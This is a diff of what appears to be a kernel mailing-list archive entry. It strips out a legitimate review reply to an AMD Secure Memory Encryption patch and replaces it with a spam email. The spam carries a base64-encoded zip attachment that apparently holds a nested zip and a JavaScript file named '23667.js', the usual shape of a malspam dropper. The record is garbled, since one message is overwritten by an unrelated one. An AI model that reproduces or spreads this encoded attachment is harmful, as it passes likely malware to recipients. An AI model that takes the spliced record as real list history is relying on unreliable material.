@@ -1,50 +1,74 @@
-From: Borislav Petkov <bp@alien8.de>
-Subject: Re: [PATCH v6 06/34] x86/mm: Add Secure Memory Encryption (SME)
- support
-Date: Fri, 9 Jun 2017 18:43:09 +0200
-Message-ID: <20170609164309.45xgyzibdkzmdbde@pd.tnic>
-References: <20170607191309.28645.15241.stgit@tlendack-t1.amdoffice.net>
- <20170607191416.28645.58145.stgit@tlendack-t1.amdoffice.net>
+From: <nfrankiyamu@centrum.cz>
+Subject: (unknown)
+Date: Fri, 09 Jun 2017 17:38:19 -0000
+Message-ID: <149702989992.30695.8223227157176375859@suttk.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Return-path: <owner-linux-mm@kvack.org>
-Content-Disposition: inline
-In-Reply-To: <20170607191416.28645.58145.stgit@tlendack-t1.amdoffice.net>
-Sender: owner-linux-mm@kvack.org
-To: Tom Lendacky <thomas.lendacky@amd.com>
-Cc: linux-arch@vger.kernel.org, linux-efi@vger.kernel.org, kvm@vger.kernel.org, linux-doc@vger.kernel.org, x86@kernel.org, kexec@lists.infradead.org, linux-kernel@vger.kernel.org, kasan-dev@googlegroups.com, linux-mm@kvack.org, iommu@lists.linux-foundation.org, Rik van Riel <riel@redhat.com>, Radim =?utf-8?B?S3LEjW3DocWZ?= <rkrcmar@redhat.com>, Toshimitsu Kani <toshi.kani@hpe.com>, Arnd Bergmann <arnd@arndb.de>, Jonathan Corbet <corbet@lwn.net>, Matt Fleming <matt@codeblueprint.co.uk>, "Michael S. Tsirkin" <mst@redhat.com>, Joerg Roedel <joro@8bytes.org>, Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>, Paolo Bonzini <pbonzini@redhat.com>, Larry Woodman <lwoodman@redhat.com>, Brijesh Singh <brijesh.singh@amd.com>, Ingo Molnar <mingo@redhat.com>, Andy Lutomirski <luto@kernel.org>, "H. Peter Anvin" <hpa@zytor.com>, Andrey Ryabinin <aryabinin@virtuozzo.com>, Alexander
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="6928391092.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from 31.113.146.83.in-addr.suttk.ru ([83.146.113.31]:53296 "HELO
+        suttk.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751562AbdFIRiZ (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Fri, 9 Jun 2017 13:38:25 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-On Wed, Jun 07, 2017 at 02:14:16PM -0500, Tom Lendacky wrote:
-> Add support for Secure Memory Encryption (SME). This initial support
-> provides a Kconfig entry to build the SME support into the kernel and
-> defines the memory encryption mask that will be used in subsequent
-> patches to mark pages as encrypted.
-> 
-> Signed-off-by: Tom Lendacky <thomas.lendacky@amd.com>
-> ---
->  arch/x86/Kconfig                   |   22 ++++++++++++++++++++++
->  arch/x86/include/asm/mem_encrypt.h |   35 +++++++++++++++++++++++++++++++++++
->  arch/x86/mm/Makefile               |    1 +
->  arch/x86/mm/mem_encrypt.c          |   21 +++++++++++++++++++++
->  include/asm-generic/mem_encrypt.h  |   27 +++++++++++++++++++++++++++
->  include/linux/mem_encrypt.h        |   18 ++++++++++++++++++
->  6 files changed, 124 insertions(+)
->  create mode 100644 arch/x86/include/asm/mem_encrypt.h
->  create mode 100644 arch/x86/mm/mem_encrypt.c
->  create mode 100644 include/asm-generic/mem_encrypt.h
->  create mode 100644 include/linux/mem_encrypt.h
-
-Reviewed-by: Borislav Petkov <bp@suse.de>
-
--- 
-Regards/Gruss,
-    Boris.
-
-Good mailing practices for 400: avoid top-posting and trim the reply.
-
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+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
